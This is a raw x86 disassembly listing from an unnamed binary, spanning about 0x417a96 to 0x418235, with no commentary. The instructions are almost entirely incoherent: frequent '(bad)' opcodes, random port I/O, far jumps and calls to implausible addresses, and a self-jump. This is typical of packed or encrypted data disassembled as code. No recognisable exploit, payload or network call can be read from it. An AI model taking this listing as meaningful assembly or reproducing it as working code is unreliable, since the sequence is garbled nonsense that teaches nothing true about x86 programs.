  417a96:	xor    al,0x38
  417a98:	gs in  eax,dx
  417a9a:	(bad)  
  417a9b:	call   0x24fa8d2f
  417aa0:	loopne 0x417ada
  417aa2:	int    0x7a
  417aa4:	int    0xaf
  417aa6:	pop    esp
  417aa7:	(bad)  
  417aa8:	cs jb  0x417a75
  417aab:	stos   DWORD PTR es:[edi],eax
  417aac:	lahf   
  417aad:	pop    es
  417aae:	mov    esp,0xef4b93ec
  417ab3:	push   0x6e
  417ab5:	sbb    esp,DWORD PTR [ecx+0x23b8659d]
  417abb:	fs ror ebx,0x32
  417abf:	dec    eax
  417ac0:	arpl   WORD PTR [eax+0x43072382],sp
  417ac6:	stc    
  417ac7:	ret    0xabd
  417aca:	fstp   DWORD PTR [ebp-0x5f]
  417acd:	push   es
  417ace:	fsubrp st(5),st
  417ad0:	inc    edi
  417ad1:	jo     0x417ab8
  417ad3:	or     al,0x4
  417ad5:	dec    edx
  417ad6:	shl    eax,0x1e
  417ad9:	fbld   TBYTE PTR [ecx+0xe4ae9b3]
  417adf:	xchg   esi,eax
  417ae0:	jmp    0x417af5
  417ae2:	pop    ds
  417ae3:	push   ebp
  417ae4:	cli    
  417ae5:	dec    ebp
  417ae6:	(bad)  
  417ae7:	int3   
  417ae8:	fwait
  417ae9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417aea:	cmp    DWORD PTR [esi+0x25],esi
  417aed:	and    DWORD PTR [esi],ebp
  417aef:	stos   BYTE PTR es:[edi],al
  417af0:	sub    eax,0xb2551331
  417af5:	cmc    
  417af6:	and    BYTE PTR [edx-0x444ed5e1],al
  417afc:	inc    esp
  417afd:	cmp    ebp,edx
  417aff:	jl     0x417b6a
  417b01:	push   ebx
  417b02:	iret   
  417b03:	inc    edi
  417b04:	stos   DWORD PTR es:[edi],eax
  417b05:	ja     0x417aa1
  417b07:	dec    edx
  417b08:	mov    esi,fs
  417b0a:	in     eax,0x5a
  417b0c:	enter  0x85a6,0xec
  417b10:	out    0xa7,al
  417b12:	(bad)  
  417b13:	mov    bl,0x4f
  417b15:	(bad)  
  417b16:	fsubr  st(0),st
  417b18:	sub    bh,BYTE PTR [ecx-0x43]
  417b1b:	push   edx
  417b1c:	rol    BYTE PTR [esp+edx*4],0xc0
  417b20:	iret   
  417b21:	ret    0xcc57
  417b24:	inc    esp
  417b25:	jae    0x417ab8
  417b27:	shr    DWORD PTR [ebp-0x446b6377],0x8b
  417b2e:	mov    ebp,0x79d402fc
  417b33:	nop
  417b34:	loop   0x417b70
  417b36:	(bad)  
  417b37:	or     al,0x4
  417b39:	jmp    0x628cc6c6
  417b3e:	mov    bh,0xbc
  417b40:	sbb    ebp,DWORD PTR [ebx]
  417b42:	mov    WORD PTR ds:0xe20ab29,?
  417b48:	push   edi
  417b49:	inc    esi
  417b4a:	int3   
  417b4b:	jle    0x417b40
  417b4d:	frstor [edx]
  417b4f:	stos   BYTE PTR es:[edi],al
  417b50:	ror    DWORD PTR [edi-0x4f],0x7a
  417b54:	pop    edi
  417b55:	push   0xf8e78373
  417b5a:	mov    dh,0x60
  417b5c:	pop    es
  417b5d:	push   esp
  417b5e:	shr    BYTE PTR [edi],1
  417b60:	jg     0x417ba8
  417b62:	mov    ah,0xc7
  417b64:	aas    
  417b65:	jmp    0x91e47d09
  417b6a:	add    eax,0xc6db5125
  417b6f:	or     al,0x67
  417b71:	nop
  417b72:	jno    0x417bb5
  417b74:	add    DWORD PTR [edx+0x5f],edx
  417b77:	mov    si,0x7fe9
  417b7b:	push   edi
  417b7c:	retf   
  417b7d:	sub    al,0x7e
  417b7f:	add    ecx,DWORD PTR [ebp-0x39]
  417b82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b83:	mov    cl,0x20
  417b85:	imul   edi,DWORD PTR cs:[edi+0x4ea93656],0x1e
  417b8d:	in     al,dx
  417b8e:	mov    BYTE PTR [ecx+0x19e71f4f],ah
  417b94:	xlat   BYTE PTR ds:[ebx]
  417b95:	or     eax,0x1a17129b
  417b9a:	mov    ecx,0x3351618
  417b9f:	xor    ch,al
  417ba1:	gs mov dl,0x52
  417ba4:	add    BYTE PTR [edi-0x23],dl
  417ba7:	ds xchg ecx,eax
  417ba9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417baa:	jmp    0x417c05
  417bac:	and    DWORD PTR [ecx-0x44],ebp
  417baf:	cmp    eax,0xb77cf8cf
  417bb4:	retf   0x2c3
  417bb7:	mov    fs,ebp
  417bb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bba:	mov    bh,0x39
  417bbc:	sbb    ch,BYTE PTR [edx-0x4f97014a]
  417bc2:	adc    DWORD PTR [esi+0x6c548058],ebx
  417bc8:	sbb    dh,BYTE PTR [edx-0x31]
  417bcb:	add    cl,ah
  417bcd:	enter  0xebeb,0xa4
  417bd1:	sub    ebp,DWORD PTR [ecx+0xd]
  417bd4:	call   0x5cad:0x567cc9ff
  417bdb:	hlt    
  417bdc:	and    DWORD PTR [eax],0x441d790a
  417be2:	dec    ecx
  417be3:	out    0x1c,al
  417be5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417be6:	ins    BYTE PTR es:[edi],dx
  417be7:	fwait
  417be8:	das    
  417be9:	test   eax,0x88e19fcd
  417bee:	test   eax,0x8e94b28b
  417bf3:	mov    al,ds:0x95ab6238
  417bf8:	xchg   ebp,eax
  417bf9:	loopne 0x417bc1
  417bfb:	mov    fs,WORD PTR ss:[ecx-0x10e444ad]
  417c02:	xchg   ebx,eax
  417c03:	sbb    ah,bh
  417c05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c06:	std    
  417c07:	inc    esp
  417c08:	mov    bh,0xb7
  417c0a:	fldenv [ecx-0x5e752ed0]
  417c10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c11:	in     eax,dx
  417c12:	jmp    0x583f:0x5e368c14
  417c19:	rcr    DWORD PTR [edx+0x6f],cl
  417c1c:	xor    eax,0x31523e45
  417c21:	sub    bl,ch
  417c23:	inc    ecx
  417c24:	inc    eax
  417c25:	loopne 0x417c63
  417c27:	jg     0x417c4b
  417c29:	(bad)  
  417c2a:	pushf  
  417c2b:	pop    edx
  417c2c:	jae    0x417c17
  417c2e:	(bad)  
  417c2f:	mov    ebx,0xf69d624d
  417c34:	ret    
  417c35:	mov    DWORD PTR [eax+ebx*8+0x3f],0xb28d38da
  417c3d:	lods   eax,DWORD PTR ds:[esi]
  417c3e:	bnd jae 0x417c7c
  417c41:	pop    es
  417c42:	shr    DWORD PTR [esp+0x1bfbacf1],0x74
  417c4a:	pusha  
  417c4b:	push   es
  417c4c:	stos   DWORD PTR es:[edi],eax
  417c4d:	jmp    0xad47f92d
  417c52:	repnz loopne 0x417c90
  417c55:	pusha  
  417c56:	pop    ebp
  417c57:	shl    BYTE PTR [ebp+0x10],0xc7
  417c5b:	in     al,dx
  417c5c:	stos   BYTE PTR es:[edi],al
  417c5d:	lds    ecx,FWORD PTR [esp+ebp*8-0x7f]
  417c61:	icebp  
  417c62:	mov    ah,dl
  417c64:	imul   esp,DWORD PTR [eax+0x68],0xffffff8d
  417c68:	mov    esp,DWORD PTR [edx]
  417c6a:	push   ds
  417c6b:	mov    ebx,0x5a37e971
  417c70:	xchg   ebp,eax
  417c71:	fsub   DWORD PTR [edx]
  417c73:	adc    eax,0xb1abe418
  417c78:	enter  0x7497,0xb8
  417c7c:	(bad)  
  417c7d:	push   ebx
  417c7e:	jge    0x417c15
  417c80:	fwait
  417c81:	pop    esp
  417c82:	cwde   
  417c83:	jo     0x417cb5
  417c85:	jns    0x417c39
  417c87:	daa    
  417c88:	ror    BYTE PTR [edi+ebp*4+0x5f5252e4],0x0
  417c90:	xor    dh,bh
  417c92:	hlt    
  417c93:	hlt    
  417c94:	push   0x3df94475
  417c99:	gs mov dh,0xcf
  417c9c:	cmp    al,0x5c
  417c9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c9f:	data16 jecxz 0x417c6b
  417ca2:	(bad)
  417ca5:	js     0x417c4b
  417ca7:	fdivr  QWORD PTR [ebx+0x7dffe4fc]
  417cad:	pop    ds
  417cae:	test   BYTE PTR [edi+ebx*1-0x7a0f7d71],al
  417cb5:	pop    esi
  417cb6:	inc    ecx
  417cb7:	mov    ah,0x90
  417cb9:	rcl    BYTE PTR fs:[ebx+0x3d5452a0],cl
  417cc0:	jle    0x417c7b
  417cc2:	bound  ebp,QWORD PTR [esi+0x5aec211]
  417cc8:	push   ecx
  417cc9:	jne    0x417c73
  417ccb:	jle    0x417c69
  417ccd:	sbb    esi,DWORD PTR [ebp-0x52]
  417cd0:	fisubr WORD PTR [bp+di+0x44]
  417cd4:	shr    DWORD PTR [ecx+0x58891d70],1
  417cda:	inc    edx
  417cdb:	xchg   DWORD PTR [esi],ebp
  417cdd:	jp     0x417ccf
  417cdf:	popfw  
  417ce1:	cmp    eax,0x2be7d13a
  417ce6:	sub    DWORD PTR [esp+edx*1-0x29c2da4b],eax
  417ced:	test   dh,bl
  417cef:	ins    BYTE PTR es:[edi],dx
  417cf0:	sub    al,0x5
  417cf2:	dec    eax
  417cf3:	or     esi,DWORD PTR [ebp+ecx*2-0x68]
  417cf7:	sbb    BYTE PTR [edx+0x5a],dh
  417cfa:	mov    esi,DWORD PTR [edx]
  417cfc:	xor    ah,BYTE PTR [edi+0x1d]
  417cff:	fsubr  QWORD PTR [ebp-0xa12679f]
  417d05:	jmp    0x54244203
  417d0a:	xor    eax,0x6aa870c3
  417d0f:	(bad)  
  417d10:	(bad)  
  417d11:	xchg   esi,eax
  417d12:	push   ebx
  417d13:	retf   
  417d14:	jmp    0x33ffa32
  417d19:	jns    0x417cfd
  417d1b:	adc    DWORD PTR [ecx+ebx*2+0x6a],0x6e
  417d20:	and    BYTE PTR [edx-0x1675e830],ah
  417d26:	add    cl,BYTE PTR [esi]
  417d28:	daa    
  417d29:	xchg   ebx,eax
  417d2a:	xchg   DWORD PTR [ecx-0x68],ebx
  417d2d:	ins    DWORD PTR es:[edi],dx
  417d2e:	in     al,0xb1
  417d30:	mov    edx,0x85645b59
  417d35:	mov    eax,0x8758283b
  417d3a:	xchg   esp,eax
  417d3b:	sub    dl,ch
  417d3d:	pushf  
  417d3e:	inc    esi
  417d3f:	test   eax,0x1187908b
  417d44:	and    BYTE PTR [ebx-0x2e],0x7a
  417d48:	xlat   BYTE PTR ds:[ebx]
  417d49:	cs pop edi
  417d4b:	adc    ecx,ebp
  417d4d:	jg     0x417d78
  417d4f:	add    BYTE PTR [esi-0x76],dl
  417d52:	sub    dh,BYTE PTR [esi]
  417d54:	ja     0x417d07
  417d56:	test   eax,0x63577fb0
  417d5b:	out    dx,eax
  417d5c:	and    al,BYTE PTR [edi+0x7d]
  417d5f:	and    al,BYTE PTR [ecx]
  417d61:	adc    edx,0x1c
  417d64:	mov    edi,0xe6756fa3
  417d69:	inc    edi
  417d6a:	sub    DWORD PTR [ebp-0x6f],0xa86dcb90
  417d71:	fs jno 0x417cf5
  417d74:	sub    edx,ebx
  417d76:	and    eax,0xd50c86dc
  417d7b:	add    esi,0x6f
  417d7e:	cmp    al,0xfe
  417d80:	loope  0x417d39
  417d82:	jp     0x417d8d
  417d84:	lock (bad) 
  417d86:	into   
  417d87:	icebp  
  417d88:	imul   bx,WORD PTR [ebp-0x7330b6b1],0xffd0
  417d90:	xchg   ebp,eax
  417d91:	clc    
  417d92:	lock push ebp
  417d94:	(bad)  
  417d96:	sbb    DWORD PTR [edx-0x57],ebx
  417d99:	jmp    0x417da0
  417d9b:	mov    DWORD PTR [edi-0x213afcc],0xbfab4c6f
  417da5:	mov    eax,0x26fe0a03
  417daa:	icebp  
  417dab:	push   cs
  417dac:	pop    es
  417dad:	dec    ecx
  417dae:	outs   dx,BYTE PTR ds:[esi]
  417daf:	loop   0x417ddb
  417db1:	xchg   edx,eax
  417db2:	(bad)  
  417db3:	and    ebp,ebp
  417db5:	push   cs
  417db6:	out    dx,al
  417db7:	clc    
  417db8:	xchg   edx,eax
  417db9:	and    bh,bh
  417dbb:	outs   dx,DWORD PTR ds:[esi]
  417dbc:	in     eax,0xc0
  417dbe:	jae    0x417e3d
  417dc0:	push   esi
  417dc1:	call   0xb78c:0xe560b65b
  417dc8:	pop    edi
  417dc9:	sbb    al,BYTE PTR [esp+ebp*4-0x36b8708]
  417dd0:	ss in  al,dx
  417dd2:	mov    eax,DWORD PTR [edx]
  417dd4:	sbb    al,0x6
  417dd6:	pop    edi
  417dd7:	hlt    
  417dd8:	sbb    al,0x34
  417dda:	adc    eax,0x5a5de2ca
  417ddf:	cmp    edi,edx
  417de1:	sbb    dl,BYTE PTR [ecx+0x5e0dd447]
  417de7:	pop    esi
  417de8:	jno    0x417e15
  417dea:	cmp    ah,0xf0
  417ded:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  417def:	lods   eax,DWORD PTR ds:[esi]
  417df0:	(bad)
  417df3:	scas   al,BYTE PTR es:[edi]
  417df4:	jo     0x417d96
  417df6:	and    eax,0xf3d3b075
  417dfb:	pop    eax
  417dfc:	aad    0x88
  417dfe:	repnz mov ecx,0x166a49b8
  417e04:	jno    0x417e70
  417e06:	mov    eax,0x57f1e03b
  417e0b:	das    
  417e0c:	add    eax,0x42609d8c
  417e11:	(bad)  
  417e13:	xor    al,0x41
  417e15:	data16 aad 0xc
  417e18:	pop    DWORD PTR [eax+0x122f3151]
  417e1e:	push   ebp
  417e1f:	das    
  417e20:	jae    0x417e29
  417e22:	(bad)  
  417e23:	arpl   WORD PTR [edx],si
  417e25:	xor    ah,BYTE PTR [edx-0x20d65b92]
  417e2b:	sahf   
  417e2c:	cmp    dl,dl
  417e2e:	fidiv  WORD PTR [edi+0x1f]
  417e31:	sbb    al,0xc8
  417e33:	add    eax,ebp
  417e35:	dec    esi
  417e36:	or     DWORD PTR [ebx+0x5d],esi
  417e39:	sub    al,0x1a
  417e3b:	stos   DWORD PTR es:[edi],eax
  417e3c:	inc    edx
  417e3d:	mov    esi,0x65020333
  417e42:	jecxz  0x417e7b
  417e44:	aas    
  417e45:	pop    edx
  417e46:	mov    ds:0x5a420fd2,al
  417e4b:	mov    esi,ebp
  417e4d:	ret    0x4bb
  417e50:	sbb    al,0x27
  417e52:	cdq    
  417e53:	(bad)  
  417e55:	dec    eax
  417e56:	test   eax,0x7796e636
  417e5b:	test   BYTE PTR [ebp-0x7f],ch
  417e5e:	lods   al,BYTE PTR ds:[esi]
  417e5f:	or     BYTE PTR [esi+0x16656747],ch
  417e65:	jge    0x417e84
  417e67:	call   FWORD PTR [esi]
  417e69:	std    
  417e6a:	xchg   DWORD PTR [ecx+0x1d51d66f],ebp
  417e70:	xchg   DWORD PTR [edi],esi
  417e72:	call   0x1afc:0x3e66a47c
  417e79:	mov    ch,0x1b
  417e7b:	in     al,dx
  417e7c:	fwait
  417e7d:	pushf  
  417e7e:	add    al,0xa1
  417e80:	mov    ebx,0x1a61b2cd
  417e85:	or     DWORD PTR [ebx+0x3bb1a08b],edi
  417e8b:	cmp    bl,BYTE PTR [esp+ebp*1+0x7320c8ee]
  417e92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e93:	xor    eax,DWORD PTR [edi]
  417e95:	hlt    
  417e96:	push   ss
  417e97:	out    dx,al
  417e98:	js     0x417ee8
  417e9a:	pop    ecx
  417e9b:	push   ds
  417e9c:	loop   0x417e35
  417e9e:	rol    DWORD PTR [esi-0x1ab8f08b],0x31
  417ea5:	sbb    edi,DWORD PTR [edx+0x65eb6faf]
  417eab:	inc    ebp
  417eac:	xchg   edi,eax
  417ead:	pop    esi
  417eae:	bound  eax,QWORD PTR [edi-0x3b]
  417eb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417eb2:	mov    edx,0xb3b0dc94
  417eb7:	pop    ebp
  417eb8:	mov    bl,0x51
  417eba:	loope  0x417f18
  417ebc:	aaa    
  417ebd:	or     eax,0x70a20e2e
  417ec2:	(bad)  
  417ec3:	das    
  417ec4:	jle    0x417f06
  417ec6:	pop    ebp
  417ec7:	fnstcw WORD PTR [eax-0x4694d50f]
  417ecd:	push   ss
  417ece:	fild   WORD PTR [ecx]
  417ed0:	cmp    ah,BYTE PTR [eax]
  417ed2:	jp     0x417e73
  417ed4:	jge    0x417eab
  417ed6:	adc    ah,BYTE PTR [edx+0x4ee3ba98]
  417edc:	aam    0xc8
  417ede:	push   ecx
  417edf:	cmp    esp,DWORD PTR [ebx]
  417ee1:	in     al,0x1d
  417ee3:	or     edi,esi
  417ee5:	sar    ah,0x8d
  417ee8:	mov    DWORD PTR [eax+ebx*1-0x4e],esi
  417eec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417eed:	and    BYTE PTR [eax+0x54],dh
  417ef0:	add    eax,0x8c517607
  417ef5:	sub    eax,0xc5f63b25
  417efa:	repz and al,0xc6
  417efd:	sbb    dh,BYTE PTR [eax]
  417eff:	addr16 dec esp
  417f01:	scas   al,BYTE PTR es:[edi]
  417f02:	pop    eax
  417f03:	in     eax,0x4a
  417f05:	pop    es
  417f06:	dec    esp
  417f07:	(bad)  
  417f08:	cmc    
  417f09:	(bad)  
  417f0a:	scas   al,BYTE PTR es:[edi]
  417f0b:	or     ebx,DWORD PTR [edi]
  417f0d:	push   cs
  417f0e:	push   ss
  417f0f:	sub    eax,0x55225e97
  417f14:	inc    edx
  417f15:	cmc    
  417f16:	pop    eax
  417f17:	xor    esp,DWORD PTR [edi+eiz*2]
  417f1a:	je     0x417eb7
  417f1c:	dec    edx
  417f1d:	out    dx,al
  417f1e:	stos   DWORD PTR es:[edi],eax
  417f1f:	lea    edx,[edx+0x469ac6f2]
  417f25:	jg     0x417f73
  417f27:	sahf   
  417f28:	jmp    0x417f28
  417f2a:	jge    0x417ece
  417f2c:	push   cs
  417f2d:	cmp    BYTE PTR [edx],0x71
  417f30:	mov    eax,ds:0x90d43e11
  417f35:	fdiv   DWORD PTR [eax]
  417f37:	fcomp  DWORD PTR [edx+0x67]
  417f3a:	mov    ds:0x7cfd30ff,eax
  417f3f:	xchg   edi,esi
  417f41:	mov    ebp,0xbc060b05
  417f46:	test   esp,esi
  417f48:	dec    ecx
  417f49:	jno    0x417f53
  417f4b:	stos   BYTE PTR es:[edi],al
  417f4c:	xor    dh,BYTE PTR [ecx-0x47acbe16]
  417f52:	imul   ebx
  417f54:	jb     0x417fac
  417f56:	in     eax,dx
  417f57:	sub    WORD PTR [ecx],bx
  417f5a:	fwait
  417f5b:	lock into 
  417f5d:	add    DWORD PTR [edi+0xb2b9aa4],ebp
  417f63:	rol    DWORD PTR [ecx-0x650e0efb],0xb9
  417f6a:	(bad)  
  417f6b:	push   0xc56b82ee
  417f70:	xchg   ecx,eax
  417f71:	stos   DWORD PTR es:[edi],eax
  417f72:	sub    al,0x7b
  417f74:	out    dx,eax
  417f75:	inc    ecx
  417f76:	inc    esp
  417f77:	arpl   WORD PTR [ebx],bx
  417f79:	daa    
  417f7a:	inc    DWORD PTR ds:0x2de8ace8
  417f80:	add    BYTE PTR [eax+0x69],cl
  417f83:	mov    ds:0x8dcc04bb,al
  417f88:	cli    
  417f89:	int    0x6f
  417f8b:	iret   
  417f8c:	stos   BYTE PTR es:[edi],al
  417f8d:	(bad)  
  417f8e:	inc    eax
  417f8f:	lea    esi,[edx]
  417f91:	stc    
  417f92:	pop    edi
  417f93:	push   ebp
  417f94:	je     0x417fcd
  417f96:	leave  
  417f97:	push   esi
  417f98:	fild   QWORD PTR [edi+ebx*8-0x30]
  417f9c:	cmp    dl,BYTE PTR [edx+edx*4+0x6d]
  417fa0:	add    ebp,edi
  417fa2:	sub    al,BYTE PTR [ebp+0x55]
  417fa5:	stc    
  417fa6:	or     ecx,edi
  417fa8:	and    esi,DWORD PTR ds:0x24e2d31c
  417fae:	jbe    0x417fbe
  417fb0:	imul   ecx,DWORD PTR [ebx+0x45],0xfffffff2
  417fb4:	add    BYTE PTR ds:0xf8228263,0xc8
  417fbb:	push   cs
  417fbc:	jnp    0x418004
  417fbe:	retf   
  417fbf:	js     0x418030
  417fc1:	ds jecxz 0x417fe5
  417fc4:	mov    DWORD PTR [edi+ebp*2+0x43389add],ebx
  417fcb:	push   ebx
  417fcc:	dec    ebp
  417fcd:	inc    ecx
  417fce:	outs   dx,BYTE PTR ds:[esi]
  417fcf:	mov    bh,0x4
  417fd1:	and    al,BYTE PTR [edi+esi*8+0x29c31239]
  417fd8:	mov    cl,BYTE PTR [edi-0x53]
  417fdb:	push   edx
  417fdc:	or     ch,BYTE PTR [edi-0x3571b49e]
  417fe2:	cdq    
  417fe3:	push   esp
  417fe4:	jo     0x417fe6
  417fe6:	jmp    0xf8cd0ee2
  417feb:	ja     0x418007
  417fed:	xchg   ecx,eax
  417fee:	clc    
  417fef:	cmp    ebp,DWORD PTR [esi+0x4]
  417ff2:	sahf   
  417ff3:	or     al,0xaa
  417ff5:	add    eax,0xd87790e9
  417ffa:	rcr    BYTE PTR ds:0x5074cece,0xd
  418001:	adc    cl,BYTE PTR [ebx-0x454bbf12]
  418007:	sub    eax,0xdab34993
  41800c:	pop    ecx
  41800d:	out    0x45,al
  41800f:	xor    esp,ecx
  418011:	sub    DWORD PTR [esi-0x3ae45629],ecx
  418017:	cmp    dl,bh
  418019:	xchg   ebx,eax
  41801a:	and    esi,DWORD PTR [ebx+0x442c705b]
  418020:	cli    
  418021:	push   0xffffff8c
  418023:	add    eax,0xa310fea9
  418028:	pop    eax
  41802a:	dec    cl
  41802c:	ror    al,cl
  41802e:	push   edx
  41802f:	xor    esi,DWORD PTR [ebx+0x2262875e]
  418035:	jns    0x418000
  418037:	adc    DWORD PTR [edi],0xb235cfc
  41803d:	loope  0x417fd6
  41803f:	retf   
  418040:	adc    al,0xa0
  418042:	into   
  418043:	xchg   esi,eax
  418044:	mov    esp,0xff726eb2
  418049:	(bad)  
  41804a:	ror    BYTE PTR [edi+0x65],0x70
  41804e:	cwde   
  41804f:	mov    BYTE PTR [ecx+ecx*1],bl
  418052:	cs pop esi
  418054:	inc    BYTE PTR [ebp+0x13]
  418057:	jmp    0x6343771b
  41805c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41805d:	dec    ebp
  41805e:	xor    eax,0x91cefc31
  418063:	into   
  418064:	jg     0x4180a7
  418066:	lds    esp,FWORD PTR [esi-0xe466d62]
  41806c:	push   es
  41806d:	jp     0x41802b
  41806f:	jns    0x4180ac
  418071:	add    al,0x44
  418073:	loope  0x418089
  418075:	cmp    al,0x3d
  418077:	sbb    ah,BYTE PTR [esi-0x7879e07a]
  41807d:	test   BYTE PTR [edx+0x6d37f213],0x4
  418084:	xor    DWORD PTR [eax],ebx
  418086:	jge    0x4180b7
  418088:	jecxz  0x418065
  41808a:	sahf   
  41808b:	and    eax,0xd2733fb4
  418090:	ret    
  418091:	dec    esp
  418092:	(bad)  
  418093:	test   eax,0x7a487a4c
  418098:	adc    DWORD PTR [ebx+0x28],ebp
  41809b:	mov    ebx,0xaf20e73a
  4180a0:	aas    
  4180a1:	(bad)  
  4180a2:	fbstp  TBYTE PTR [ebp+0x4f99a35b]
  4180a8:	xchg   esp,eax
  4180a9:	jo     0x418057
  4180ab:	inc    edx
  4180ac:	push   edi
  4180ad:	rcl    DWORD PTR [esi+edx*2],1
  4180b0:	icebp  
  4180b1:	in     al,0x6c
  4180b3:	inc    esi
  4180b4:	test   BYTE PTR ds:0x20cfefda,bh
  4180ba:	outs   dx,DWORD PTR gs:[esi]
  4180bc:	aas    
  4180bd:	dec    esi
  4180be:	push   esp
  4180bf:	lods   al,BYTE PTR ds:[esi]
  4180c0:	and    al,0x19
  4180c2:	sbb    al,0xcf
  4180c4:	adc    al,0xf9
  4180c6:	(bad)  
  4180c7:	pop    eax
  4180c8:	inc    eax
  4180c9:	add    BYTE PTR [eax+0x3f],bl
  4180cc:	aaa    
  4180cd:	mov    dh,0xcc
  4180cf:	scas   eax,DWORD PTR es:[edi]
  4180d0:	rcl    BYTE PTR [ebp+0x22],0x88
  4180d4:	cmp    bl,BYTE PTR [ebx+0x3d]
  4180d7:	int3   
  4180d8:	(bad)  
  4180d9:	push   esp
  4180da:	ss jmp 0xf2b0:0x8c4521a
  4180e2:	xlat   BYTE PTR ds:[ebx]
  4180e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180e4:	lods   al,BYTE PTR ds:[esi]
  4180e5:	add    DWORD PTR [ebx+0x59a3073b],ebp
  4180eb:	dec    edi
  4180ec:	sub    esi,DWORD PTR [ecx]
  4180ee:	shl    BYTE PTR [ebx+0x49],1
  4180f1:	inc    ebx
  4180f2:	(bad)  
  4180f3:	outs   dx,DWORD PTR ds:[esi]
  4180f4:	jae    0x418114
  4180f6:	sar    BYTE PTR [ebx+0xb],1
  4180f9:	std    
  4180fa:	add    cl,dh
  4180fc:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4180fe:	das    
  4180ff:	loope  0x418105
  418101:	clc    
  418102:	sbb    eax,0x300aacb8
  418107:	mov    al,cl
  418109:	retf   
  41810a:	sahf   
  41810b:	push   ebp
  41810c:	adc    ebx,DWORD PTR [edx]
  41810e:	imul   edx,DWORD PTR [ebx],0xffffffbe
  418111:	jno    0x418115
  418113:	cmp    BYTE PTR [eax-0x38e8db],ah
  418119:	mov    WORD PTR [ebx+0x7325630c],ss
  41811f:	sbb    DWORD PTR gs:[ecx+0x8],ebp
  418123:	in     al,dx
  418124:	xchg   edi,eax
  418125:	mov    bl,ah
  418127:	cmp    eax,DWORD PTR [esi]
  418129:	or     cl,BYTE PTR [esi-0x3f953b22]
  41812f:	out    0x68,eax
  418131:	daa    
  418132:	gs sub bl,cl
  418135:	lds    edi,FWORD PTR [esi-0x2bb07449]
  41813b:	call   0x7006394c
  418140:	xchg   esi,eax
  418141:	imul   DWORD PTR [eax+0x7e812dc0]
  418147:	repnz pushf 
  418149:	jbe    0x4180db
  41814b:	ror    edi,cl
  41814d:	ins    DWORD PTR es:[edi],dx
  41814e:	arpl   WORD PTR [esi],dx
  418150:	aad    0x8c
  418152:	ins    BYTE PTR es:[edi],dx
  418153:	xor    eax,0xf21b4f13
  418158:	loopne 0x4180f4
  41815a:	add    ebx,ebp
  41815c:	sbb    DWORD PTR [ebx],0x5b
  41815f:	mov    dh,0xb6
  418161:	push   edi
  418162:	into   
  418163:	icebp  
  418164:	fistp  DWORD PTR [edx+edi*1-0x23]
  418168:	ds rcr dh,cl
  41816b:	push   esp
  41816c:	enter  0xdce3,0xc3
  418170:	mov    ecx,ecx
  418172:	dec    esi
  418173:	cmp    al,0x76
  418175:	fidiv  WORD PTR [edx]
  418177:	dec    esi
  418178:	aad    0x58
  41817a:	jl     0x4181a7
  41817c:	aam    0xdf
  41817e:	dec    esp
  41817f:	sub    al,0xea
  418181:	fwait
  418182:	push   esp
  418183:	in     eax,0x9b
  418185:	mov    esi,0x2d1b00b3
  41818a:	add    eax,0x9a4214e2
  41818f:	lahf   
  418190:	iret   
  418191:	push   eax
  418192:	push   es
  418193:	leave  
  418194:	push   cs
  418195:	out    dx,al
  418196:	repnz mov ?,WORD PTR [edx]
  418199:	ss sti 
  41819b:	lods   eax,DWORD PTR ds:[esi]
  41819c:	xor    eax,0xfdae9b90
  4181a1:	add    ebp,edi
  4181a3:	(bad)  
  4181a4:	ins    BYTE PTR es:[edi],dx
  4181a5:	pop    ds
  4181a6:	xor    ebp,DWORD PTR [ebp-0x6f]
  4181a9:	call   0xda09:0xf90c3616
  4181b0:	xchg   DWORD PTR [ecx+0x70],ebp
  4181b3:	sub    cl,BYTE PTR [ebx]
  4181b5:	dec    eax
  4181b6:	test   al,0xcd
  4181b8:	jecxz  0x41814f
  4181ba:	and    DWORD PTR gs:[ebx],esi
  4181bd:	inc    ecx
  4181be:	mov    WORD PTR gs:[eax+0x64],?
  4181c2:	retf   0xfc9f
  4181c5:	ss daa 
  4181c7:	and    DWORD PTR [esi+0x25],edi
  4181ca:	(bad)  
  4181cb:	mov    ah,0x93
  4181cd:	(bad)  
  4181cf:	scas   eax,DWORD PTR es:[edi]
  4181d0:	pop    eax
  4181d1:	pusha  
  4181d2:	mov    edx,esi
  4181d4:	arpl   WORD PTR [edi],si
  4181d6:	xchg   edx,eax
  4181d7:	mov    dl,0x85
  4181d9:	xor    dl,bh
  4181db:	pushf  
  4181dc:	cmp    eax,0xe923d332
  4181e1:	(bad)  
  4181e2:	xchg   esp,eax
  4181e3:	xchg   edx,eax
  4181e4:	scas   al,BYTE PTR es:[edi]
  4181e5:	popa   
  4181e6:	mov    edx,DWORD PTR [ebx+0x3b50c161]
  4181ec:	mov    esi,0xd1daf539
  4181f1:	jnp    0x4181e4
  4181f3:	fldenv [ebp+0x359db071]
  4181f9:	dec    edx
  4181fa:	fidivr DWORD PTR [ecx-0x3b]
  4181fd:	cmp    BYTE PTR [esp+ebx*2+0x19],0x2c
  418202:	push   esp
  418203:	or     al,0x3e
  418205:	test   BYTE PTR [ebx],al
  418207:	stos   BYTE PTR es:[edi],al
  418208:	jbe    0x4181af
  41820a:	jp     0x4181e7
  41820c:	pop    edi
  41820d:	enter  0xe245,0xe0
  418211:	das    
  418212:	int3   
  418213:	dec    eax
  418214:	push   ds
  418215:	pop    ebp
  418216:	push   0x44e9424f
  41821b:	and    BYTE PTR [esi+0x1750176c],ch
  418221:	pop    es
  418222:	push   ebp
  418223:	call   0xf543:0x5a5b1df2
  41822a:	into   
  41822b:	div    BYTE PTR [eax-0x4cd3aad]
  418231:	imul   edx,DWORD PTR [edx],0xfffffff0
  418234:	dec    ebx
  418235:	dec    edx
